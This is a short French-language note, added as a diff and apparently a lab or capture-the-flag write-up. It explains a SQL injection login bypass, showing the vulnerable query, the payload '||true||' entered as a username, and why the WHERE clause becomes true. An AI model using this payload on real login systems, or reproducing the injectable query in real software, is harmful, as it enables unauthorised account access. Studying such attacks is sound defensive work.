@@ -1,0 +1,22 @@
+Requête dans le back-end :
+
+    SELECT * FROM users WHERE username = '' AND password = '';
+
+En injectant ceci dans le nom d'utilisateur
+
+    '||true||'
+
+On obtient :
+
+    SELECT * FROM users WHERE username = ''||true||'' AND password = '';
+
+Avec :
+
+    username = ''||true --> username = '' OR true --> true
+    '' AND password --> false
+
+On a :
+
+    WHERE true||false --> true OR false --> true
+
+
